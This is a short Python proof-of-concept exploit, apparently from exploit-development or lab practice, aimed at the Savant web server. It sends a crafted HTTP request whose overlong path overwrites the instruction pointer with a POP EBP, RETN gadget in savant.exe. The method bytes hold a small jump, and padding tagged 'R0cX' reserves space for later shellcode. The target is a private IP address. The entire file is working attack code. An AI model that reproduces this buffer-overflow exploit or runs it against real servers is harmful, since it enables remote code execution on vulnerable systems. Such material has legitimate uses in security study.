#!/usr/bin/python
import socket

target_address="192.168.100.118"
target_port=80

badbuffer = "\xcc"
badbuffer += "\x41" * (254 - len(badbuffer))
badbuffer += "\x09\x1D\x40" # EIP Overwrite 00401D09 savant.exe POP EBP, RETN

httpmethod = "\xb0\x03\x04\x01\x7B\x14" # MOV AL, 3; ADD AL, 1; JPO 14

# Carving space for shellcode in the Program's memory
buffer2 = "R0cX" + "R0cX" + "\x41" * 992

sendbuf = httpmethod + " /%" + badbuffer + '\r\n\r\n' + buffer2

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(sendbuf)
sock.close()

